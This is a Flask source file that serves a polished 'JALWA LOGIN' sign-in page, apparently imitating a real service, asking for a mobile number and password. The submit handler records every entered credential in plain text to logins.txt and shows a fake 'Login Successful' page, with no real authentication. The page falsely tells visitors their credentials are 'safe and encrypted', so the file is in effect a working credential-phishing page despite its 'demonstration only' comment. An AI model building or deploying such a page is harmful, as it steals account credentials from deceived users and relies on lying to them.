from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Premium Login Portal ✨</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
        <style>
            body {
                min-height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #0f2027, #2c5364 80%);
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: 'Roboto Mono', monospace;
                overflow: hidden;
            }
            .glass-card {
                background: rgba(255, 255, 255, 0.12);
                border-radius: 20px;
                box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
                backdrop-filter: blur(8px);
                -webkit-backdrop-filter: blur(8px);
                border: 1.5px solid rgba(255,255,255,0.18);
                padding: 48px 36px 36px 36px;
                width: 340px;
                text-align: center;
                animation: fadeIn 1.5s;
            }
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(-60px);}
                to { opacity: 1; transform: translateY(0);}
            }
            .logo {
                font-family: 'Orbitron', sans-serif;
                font-size: 2.6rem;
                color: #00ffd0;
                letter-spacing: 2px;
                margin-bottom: 12px;
                text-shadow: 0 0 18px #00ffd0, 0 0 6px #fff;
                animation: logoGlow 2s infinite alternate;
            }
            @keyframes logoGlow {
                from {text-shadow: 0 0 18px #00ffd0, 0 0 6px #fff;}
                to {text-shadow: 0 0 36px #00ffd0, 0 0 12px #fff;}
            }
            .subtitle {
                color: #fff;
                font-size: 1.15rem;
                margin-bottom: 30px;
                letter-spacing: 1.5px;
                opacity: 0.85;
            }
            form {
                display: flex;
                flex-direction: column;
                gap: 20px;
            }
            input[type="text"], input[type="password"] {
                padding: 14px;
                border: none;
                border-radius: 10px;
                font-size: 1.1rem;
                background: rgba(255,255,255,0.17);
                color: #00ffd0;
                outline: none;
                box-shadow: 0 2px 8px rgba(0,255,208,0.09);
                transition: box-shadow 0.2s;
            }
            input[type="text"]:focus, input[type="password"]:focus {
                box-shadow: 0 0 16px #00ffd0;
            }
            input[type="submit"] {
                padding: 14px;
                font-size: 1.2rem;
                font-weight: bold;
                color: #fff;
                background: linear-gradient(90deg, #00ffd0 40%, #ff00cc 100%);
                border: none;
                border-radius: 10px;
                cursor: pointer;
                box-shadow: 0 0 24px #00ffd0, 0 0 12px #ff00cc;
                letter-spacing: 1.5px;
                transition: background 0.2s, color 0.2s, box-shadow 0.2s;
            }
            input[type="submit"]:hover {
                background: linear-gradient(90deg, #ff00cc 40%, #00ffd0 100%);
                color: #222;
                box-shadow: 0 0 32px #ff00cc, 0 0 18px #00ffd0;
            }
            .note {
                margin-top: 22px;
                color: #fffa;
                font-size: 1rem;
                text-shadow: 0 0 6px #00ffd0;
            }
            @media (max-width: 500px) {
                .glass-card { width: 92vw; padding: 24px 8vw 18px 8vw;}
            }
        </style>
    </head>
    <body>
        <div class="glass-card">
            <div class="logo">JALWA LOGIN</div>
            <div class="subtitle">Welcome to your premium portal.<br>Sign in to continue.</div>
            <form action="/submit" method="post" autocomplete="off">
                <input type="text" name="number" placeholder="Mobile Number" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" value="Sign In">
            </form>
            <div class="note">Your credentials are safe and encrypted.</div>
        </div>
    </body>
    </html>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    number = request.form.get('number')
    password = request.form.get('password')
    # Logging for demonstration only. In production, never store passwords in plain text!
    with open("logins.txt", "a") as f:
        f.write(f"Number: {number}, Password: {password}\n")
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Login Success</title>
        <meta charset="UTF-8">
        <style>
            body {
                background: linear-gradient(135deg, #0f2027, #2c5364 80%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: 'Roboto Mono', monospace;
            }
            .glass-card {
                background: rgba(255, 255, 255, 0.12);
                border-radius: 20px;
                box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
                backdrop-filter: blur(8px);
                -webkit-backdrop-filter: blur(8px);
                border: 1.5px solid rgba(255,255,255,0.18);
                padding: 48px 36px 36px 36px;
                width: 340px;
                text-align: center;
                animation: fadeIn 1.5s;
            }
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(60px);}
                to { opacity: 1; transform: translateY(0);}
            }
            .success {
                color: #00ffd0;
                font-size: 2rem;
                margin-bottom: 14px;
                text-shadow: 0 0 18px #00ffd0, 0 0 6px #fff;
            }
            a {
                color: #ff00cc;
                font-size: 1.1rem;
                text-decoration: none;
                margin-top: 18px;
                display: inline-block;
                transition: color 0.2s;
            }
            a:hover {
                color: #00ffd0;
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="glass-card">
            <div class="success">✅ Login Successful!</div>
            <a href="/">Back to Login</a>
        </div>
    </body>
    </html>
    '''

if __name__ == "__main__":
    app.run(debug=True)
